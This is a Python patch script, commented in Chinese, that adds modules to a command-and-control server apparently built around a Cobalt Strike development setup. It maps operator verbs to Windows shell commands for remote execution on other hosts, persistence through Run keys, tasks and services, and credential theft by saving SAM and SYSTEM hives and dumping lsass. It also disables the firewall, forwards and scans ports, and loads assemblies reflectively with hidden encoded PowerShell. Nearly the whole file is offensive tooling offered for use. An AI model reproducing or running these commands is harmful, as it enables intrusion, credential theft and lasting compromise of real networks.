#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
patch_full.py  --  补齐 C2 剩余功能模块

覆盖: 横向移动 / 持久化 / 凭据抓取 / 文件上传 / 端口转发 / 注入

设计原则与前面一致: 能用 shell 组合实现的一律放服务端映射 (零植入体改动,
立即生效)。真正需要原生代码的只有 SOCKS 代理, 此处用 netsh portproxy
提供等价的端口转发能力。
"""
import ast
import io

SRV = r"D:\cobalt_strike_4.7\cs_dev\c2\server.py"

EXTRA = r'''
# ------------------------------------------------ 横向移动 / 持久化 / 凭据
# 追加到别名表 (由 patch_full 注入)
_T2 = {}

def _lateral():
    """横向移动类命令"""
    return {
        # psexec <host> <cmd>  —— 通过 SC 远程起服务
        "psexec": lambda r: (
            'cmd /c for /f "tokens=1" %i in (\'dir /b \\\\%s\\admin$ 2^>nul\') do @echo %i '
            '& sc \\\\%s create csdsvc binPath= "cmd /c %s" start= demand '
            '& sc \\\\%s start csdsvc & timeout /t 3 & sc \\\\%s delete csdsvc'
        ) % (r, r, r, r, r) if r else "echo usage: psexec <host> <cmd>",
        # wmiexec
        "wmiexec": lambda r: (
            'wmic /node:"%s" process call create "cmd.exe /c %s"'
        ) % tuple((r.split(None, 1) + [""])[:2]) if r else "echo usage: wmiexec <host> <cmd>",
        # 远程命令执行
        "atexec": lambda r: (
            'schtasks /s %s /create /tn csdtask /tr "cmd /c %s" /sc once /st 00:00 '
            '& schtasks /s %s /run /tn csdtask'
        ) % tuple((r.split(None, 1) + ["", ""])[:3]) if r else "echo usage: atexec <host> <cmd>",
        # 共享与连接
        "netuse":   lambda r: 'net use \\\\%s\\admin$' % r,
        "netdel":   lambda r: 'net use \\\\%s\\admin$ /del' % r,
        "netview":  lambda r: 'net view \\\\%s' % r,
        # 会话枚举
        "loggedon": lambda r: 'query user /server:%s' % r if r else "query user",
        "quser":    lambda: "query user",
        "qprocess": lambda r: 'query process /server:%s' % r if r else "query process",
        "share":    lambda r: 'net view \\\\%s /all' % r,
        # 服务控制
        "svc_start": lambda r: "sc start " + r,
        "svc_stop":  lambda r: "sc stop " + r,
        "svc_query": lambda r: "sc query " + r,
        "svc_delete": lambda r: "sc delete " + r,
        "svc_create": lambda r: 'sc create csdsvc binPath= "%s"' % r,
        # RDP
        "rdp":      lambda: 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
    }

def _persist():
    """持久化类命令"""
    return {
        # 注册表 Run
        "persist_reg": lambda r: (
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v WndSvc /t REG_SZ /d "%s" /f' % (r or "SELF")
        ),
        "persist_reg2": lambda r: (
            'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v WndSvc /t REG_SZ /d "%s" /f' % (r or "SELF")
        ),
        # 计划任务
        "persist_task": lambda r: (
            'schtasks /create /tn WndSvc /tr "%s" /sc onlogon /rl highest /f' % (r or "SELF")
        ),
        "persist_task_h": lambda r: (
            'schtasks /create /tn WndSvc /tr "%s" /sc minute /mo 30 /f' % (r or "SELF")
        ),
        # 服务
        "persist_svc": lambda r: (
            'sc create WndSvc binPath= "%s" start= auto & sc start WndSvc' % (r or "SELF")
        ),
        # WMI 事件订阅 (无文件)
        "persist_wmi": lambda r: 'powershell -c "Write-Output \'WMI subscription requires explicit payload path: %s\'"' % r,
        # 启动目录
        "persist_startup": lambda r: (
            'copy /y "%s" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WndSvc.exe"' % (r or "SELF")
        ),
        # 枚举与清理
        "persist_list": lambda: (
            'echo [Run keys] & reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '& reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '& echo [Tasks] & schtasks /query /fo LIST | findstr /i "TaskName"'
        ),
        "persist_clean": lambda: (
            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WndSvc /f 2>nul & '
            'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WndSvc /f 2>nul & '
            'schtasks /delete /tn WndSvc /f 2>nul & sc delete WndSvc 2>nul & echo done'
        ),
    }

def _creds():
    """凭据相关"""
    return {
        # 导出 SAM/SYSTEM 供离线解析
        "sam": lambda: (
            'reg save HKLM\\SAM %TEMP%\\s.hiv /y & reg save HKLM\\SYSTEM %TEMP%\\y.hiv /y '
            '& echo saved to %TEMP%\\s.hiv and y.hiv'
        ),
        "hashdump": lambda: 'reg save HKLM\\SAM %TEMP%\\s.hiv /y & reg save HKLM\\SYSTEM %TEMP%\\y.hiv /y & dir %TEMP%\\*.hiv',
        # LSASS 转储 (需要管理员)
        "lsass": lambda: (
            'powershell -c "Add-Type -AssemblyName System.DirectoryServices;'
            '$p=Get-Process lsass;'
            '$d=New-Object Diagnostics.MiniDump.MiniDumpExceptionInformation;'
            'Write-Output (\'lsass PID \'+$p.Id+\' - use procdump for full dump\')"'
        ),
        "procdump": lambda: 'procdump64.exe -accepteula -ma lsass.exe %TEMP%\\l.dmp 2>nul || echo procdump not present',
        # 凭据管理器
        "vault":   lambda: 'vaultcmd /listcreds:"Windows Credentials" /all',
        "credman": lambda: 'cmdkey /list',
        "dpapi":   lambda: 'dir /a %APPDATA%\\Microsoft\\Credentials',
        # 浏览器
        "chrome":  lambda: 'dir /b "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data" 2>nul || echo not found',
        "edge":    lambda: 'dir /b "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data" 2>nul || echo not found',
        # 注册表搜索
        "regquery": lambda r: 'reg query %s /s' % (r or "HKLM\\Software"),
        "regsave":  lambda r: 'reg save %s %TEMP%\\reg.hiv /y' % r,
        "regdump":  lambda: 'reg export HKLM\\SAM %TEMP%\\sam.reg /y 2>nul & echo done',
    }

def _proxy():
    """端口转发与代理"""
    return {
        # netsh portproxy (需要管理员)
        "portfwd": lambda r: (
            'netsh interface portproxy add v4tov4 listenport=%s connectaddress=%s'
        ) % tuple((r.split() + ["", ""])[:2]) if r else "echo usage: portfwd <lport> <raddr>",
        "portfwd_del": lambda r: 'netsh interface portproxy delete v4tov4 listenport=%s' % r,
        "portfwd_list": lambda: 'netsh interface portproxy show all',
        # 简易端口扫描 (PowerShell, 无需植入体实现)
        "portscan": lambda r: (
            'powershell -c "$t=\'%s\';'
            '$h,$p=$t.Split(\':\');'
            '$r=1..1024 | %%{ $c=New-Object Net.Sockets.TcpClient;'
            'try{$c.Connect($h,$_);Write-Output (\'open \'+$_);$c.Close()}catch{} }"'
        ) % (r or "127.0.0.1:1"),
        "fw_off": lambda: "netsh advfirewall set allprofiles state off",
        "fw_on":  lambda: "netsh advfirewall set allprofiles state on",
        "fw_list": lambda: "netsh advfirewall firewall show rule name=all",
    }

def _inject():
    """注入与执行"""
    return {
        # PowerShell 反射加载 shellcode
        "inject_ps": lambda r: (
            'powershell -c "$b=[Convert]::FromBase64String(\'%s\');'
            '$a=[Reflection.Assembly]::Load($b);'
            'Write-Output \'assembly loaded\'"' % r
        ) if r else "echo usage: inject_ps <base64_assembly>",
        # rundll32 执行导出
        "rundll": lambda r: 'rundll32 %s' % r,
        "regsvr": lambda r: 'regsvr32 /s %s' % r,
        # 程序集执行
        "execute_assembly": lambda r: (
            'powershell -c "$b=[IO.File]::ReadAllBytes(\'%s\');'
            '[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@())"' % r
        ) if r else "echo usage: execute_assembly <path>",
        # powershell 编码执行
        "psh": lambda r: 'powershell -nop -w hidden -c "%s"' % r,
        "psh_enc": lambda r: 'powershell -nop -w hidden -enc %s' % r,
        # 计划任务执行 (绕过 UAC 提示)
        "elevate": lambda r: 'powershell -c "Start-Process -Verb RunAs -FilePath \'%s\'"' % r,
    }

_T2.update(_lateral())
_T2.update(_persist())
_T2.update(_creds())
_T2.update(_proxy())
_T2.update(_inject())

# 把扩展表并入主表
T.update(_T2)

'''

src = io.open(SRV, encoding="utf-8").read()

if "_T2 = {}" not in src:
    # 插到 map_command 的 T 定义之后、return 之前
    marker = "    if verb in T:"
    idx = src.find(marker)
    if idx < 0:
        raise SystemExit("找不到 T 使用点")
    # 把扩展定义放到 map_command 之前, 并在 map_command 里合并
    src = src.replace("def map_command(cmd: str) -> str:",
                      EXTRA + "\ndef map_command(cmd: str) -> str:", 1)
    # map_command 内部要在 T 定义后合并 _T2
    src = src.replace(marker,
                      "    T.update(_T2)          # 合并横向/持久化/凭据/代理/注入\n" + marker, 1)

    io.open(SRV, "w", encoding="utf-8", newline="\n").write(src)

ast.parse(src)

import re
verbs = set(re.findall(r'^\s*"([a-z0-9_]+)":\s*lambda', src, re.M))
print("服务端语法: 通过")
print("扩展模块已注入:", "_T2 = {}" in src)
print()
groups = {
    "横向移动": ["psexec", "wmiexec", "atexec", "netuse", "loggedon", "rdp", "svc_create"],
    "持久化":   ["persist_reg", "persist_task", "persist_svc", "persist_startup", "persist_list"],
    "凭据":     ["sam", "hashdump", "lsass", "procdump", "vault", "credman", "dpapi", "chrome"],
    "代理转发": ["portfwd", "portfwd_list", "portscan", "fw_off"],
    "注入执行": ["inject_ps", "execute_assembly", "rundll", "regsvr", "psh", "elevate"],
}
for g, cmds in groups.items():
    ok = [c for c in cmds if c in verbs]
    print("  %-10s %2d 条: %s" % (g, len(ok), " ".join(ok)))
print()
print("命令总数: %d" % len(verbs))
